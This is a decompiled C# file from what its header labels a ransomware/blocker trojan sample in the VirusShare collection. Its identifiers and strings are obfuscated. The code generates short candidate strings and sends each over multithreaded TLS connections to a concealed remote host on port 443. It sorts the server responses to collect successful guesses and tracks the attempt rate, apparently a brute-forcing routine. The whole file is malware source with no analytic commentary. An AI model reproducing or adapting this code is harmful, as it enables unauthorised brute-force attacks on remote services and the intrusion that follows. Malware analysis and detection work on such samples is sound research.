// Decompiled with JetBrains decompiler
// Type: 
// Assembly: C, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AECD4788-48C4-479F-A68E-650A413D34DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hdzx-b05eaa7039890b2e3bc00b0bc2db874ad84b4753c0d19c47e9c03bc831a18253.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

public sealed class \u0008
{
  public string[] \u0002;
  public static int \u0003 = 2;
  public static int \u0005 = 0;
  public static \u0006 \u0008;
  public static bool \u0006 = false;
  public static int \u000E = 0;
  public static string \u000F = \u0008\u2000.\u0002(1696690667);
  public string[] \u0002\u2000;
  private int \u0003\u2000;
  private string \u0005\u2000;
  private int \u0008\u2000;
  private string \u0006\u2000;
  private string[] \u000E\u2000;
  public static List<string> \u000F\u2000 = new List<string>();

  public \u0008()
  {
    this.\u0002\u2000 = new string[5];
    this.\u0005\u2000 = \u0008\u2000.\u0002(1696690680);
    this.\u0008\u2000 = 443;
    string str = \u0008\u2000.\u0002(1696690642);
    this.\u0006\u2000 = this.\u0002(ref str);
    this.\u000E\u2000 = new string[5]
    {
      \u0008\u2000.\u0002(1696692123),
      \u0008\u2000.\u0002(1696692202),
      \u0008\u2000.\u0002(1696692217),
      \u0008\u2000.\u0002(1696692168),
      \u0008\u2000.\u0002(1696692191)
    };
  }

  public void \u0002(int _param1)
  {
    \u0008.\u0003 = _param1;
    string str1 = \u0008\u2000.\u0002(1696692014);
    string str2 = \u0008\u2000.\u0002(1696691992);
    List<string> stringList = new List<string>();
    string str3 = str1.Replace(\u0008\u2000.\u0002(1696692076), string.Empty).Replace(\u0008\u2000.\u0002(1696692084), string.Empty).Replace(\u0008\u2000.\u0002(1696692092), string.Empty);
    int index1 = 0;
    int length1 = str3.Length;
    while (index1 < length1)
    {
      string str4 = Conversions.ToString(str3[index1]);
      stringList.Add(str4);
      checked { ++index1; }
    }
    if (_param1 > 0)
    {
      string str5 = str1;
      int index2 = 0;
      int length2 = str5.Length;
      while (index2 < length2)
      {
        string str6 = Conversions.ToString(str5[index2]);
        if (!str2.Contains(str6))
        {
          string str7 = str1;
          int index3 = 0;
          int length3 = str7.Length;
          while (index3 < length3)
          {
            string Left = Conversions.ToString(str7[index3]);
            if (Operators.CompareString(Left, \u0008\u2000.\u0002(1696692092), false) != 0)
            {
              string str8 = str6 + Left;
              if (!str8.Contains(\u0008\u2000.\u0002(1696692036)))
                stringList.Add(str8);
            }
            checked { ++index3; }
          }
        }
        checked { ++index2; }
      }
    }
    if (_param1 > 1)
    {
      string str9 = str1;
      int index4 = 0;
      int length4 = str9.Length;
      while (index4 < length4)
      {
        string str10 = Conversions.ToString(str9[index4]);
        if (!str2.Contains(str10))
        {
          string str11 = str1;
          int index5 = 0;
          int length5 = str11.Length;
          while (index5 < length5)
          {
            string str12 = Conversions.ToString(str11[index5]);
            string str13 = str1;
            int index6 = 0;
            int length6 = str13.Length;
            while (index6 < length6)
            {
              string Left = Conversions.ToString(str13[index6]);
              if (Operators.CompareString(Left, \u0008\u2000.\u0002(1696692092), false) != 0)
              {
                string str14 = str10 + str12 + Left;
                if (!str14.Contains(\u0008\u2000.\u0002(1696692036)))
                  stringList.Add(str14);
              }
              checked { ++index6; }
            }
            checked { ++index5; }
          }
        }
        checked { ++index4; }
      }
    }
    this.\u0002 = stringList.ToArray();
    stringList.Clear();
  }

  public void \u0002()
  {
    while (!\u0008.\u0006)
    {
      \u0008.\u0005 = checked ((int) Math.Round(unchecked ((double) checked (\u0008.\u000E - this.\u0003\u2000) / 5.0)));
      this.\u0003\u2000 = \u0008.\u000E;
      Thread.Sleep(5000);
    }
  }

  public void \u0003(int _param1_1)
  {
    this.\u0002(_param1_1);
    new Thread(new ThreadStart(this.\u0002), 100).Start();
    int num1 = checked (this.\u0002\u2000.Length - 1);
    int parameter = 0;
    while (parameter <= num1)
    {
      this.\u0002\u2000[parameter] = string.Empty;
      new Thread((ParameterizedThreadStart) (_param1_2 => this.\u0005(Conversions.ToInteger(_param1_2))), 100).Start((object) parameter);
      checked { ++parameter; }
    }
label_3:
    if (\u0008.\u000F\u2000.Count > 10)
      \u0008.\u000F\u2000.Clear();
    if (\u0008.\u0006)
      return;
    int num2 = checked (this.\u0002\u2000.Length - 1);
    int index = 0;
    while (index <= num2)
    {
      Thread.Sleep(1);
      if (this.\u0002\u2000[index].Length == 0)
      {
        this.\u0002\u2000[index] = this.\u0002[\u0008.\u000E] + \u0008.\u000F;
        checked { ++\u0008.\u000E; }
        if (\u0008.\u000E > checked (this.\u0002.Length - 1))
          \u0008.\u000E = 0;
      }
      checked { ++index; }
    }
    goto label_3;
  }

  private bool \u0002(ref string _param1)
  {
    string[] strArray = Strings.Split(Strings.Replace(this.\u0006\u2000, \u0008\u2000.\u0002(1696692051), _param1), \u0008\u2000.\u0002(1696692057));
    while (true)
    {
      TcpClient tcpClient = new TcpClient();
      try
      {
        tcpClient.Connect(this.\u0005\u2000, this.\u0008\u2000);
        SslStream sslStream = new SslStream((Stream) tcpClient.GetStream(), false, new RemoteCertificateValidationCallback(\u0008.\u0002), (LocalCertificateSelectionCallback) null);
        sslStream.AuthenticateAsClient(this.\u0005\u2000);
        ASCIIEncoding asciiEncoding = new ASCIIEncoding();
        byte[] numArray1 = new byte[801];
        byte[] numArray2 = new byte[1];
        int num = checked (strArray.Length - 1);
        int index = 0;
        while (index <= num)
        {
          numArray2 = new byte[checked (asciiEncoding.GetBytes(strArray[index] + \u0008\u2000.\u0002(1696692057)).Length + 1)];
          byte[] bytes = asciiEncoding.GetBytes(strArray[index] + \u0008\u2000.\u0002(1696692057));
          sslStream.Write(bytes, 0, bytes.Length);
          sslStream.Flush();
          checked { ++index; }
        }
        tcpClient.ReceiveTimeout = 5000;
        sslStream.Read(numArray1, 0, numArray1.Length);
        string str = asciiEncoding.GetString(numArray1);
        if (str.Contains(this.\u000E\u2000[0]) || str.Contains(this.\u000E\u2000[1]) || str.Contains(this.\u000E\u2000[2]))
          return false;
        if (str.Contains(this.\u000E\u2000[3]))
          return true;
        if (str.Contains(this.\u000E\u2000[4]))
          return false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Operators.CompareString(\u0008.\u000F, \u0008\u2000.\u0002(1696691872), false) != 0 && !\u0008.\u0006)
        Thread.Sleep(100);
      else
        break;
    }
    return false;
  }

  private static bool \u0002(
    object _param0,
    X509Certificate _param1,
    X509Chain _param2,
    SslPolicyErrors _param3)
  {
    return _param3 == SslPolicyErrors.None;
  }

  public string \u0002(ref string _param1) => Encoding.UTF8.GetString(Convert.FromBase64String(_param1));

  public void \u0005(int _param1)
  {
    if (Operators.CompareString(this.\u0002\u2000[_param1], \u0008\u2000.\u0002(1696691880), false) == 0)
      this.\u0002\u2000[_param1] = string.Empty;
    while (!\u0008.\u0006)
    {
      if (Operators.CompareString(\u0008.\u000F, \u0008\u2000.\u0002(1696691872), false) == 0)
      {
        Thread.Sleep(100);
      }
      else
      {
        try
        {
          if (this.\u0002\u2000[_param1].Length > 0)
          {
            string str = this.\u0002\u2000[_param1];
            this.\u0002\u2000[_param1] = string.Empty;
            if (this.\u0002(ref str))
              \u0008.\u000F\u2000.Add(str);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(10);
      }
    }
    this.\u0002\u2000[_param1] = \u0008\u2000.\u0002(1696691880);
  }
}
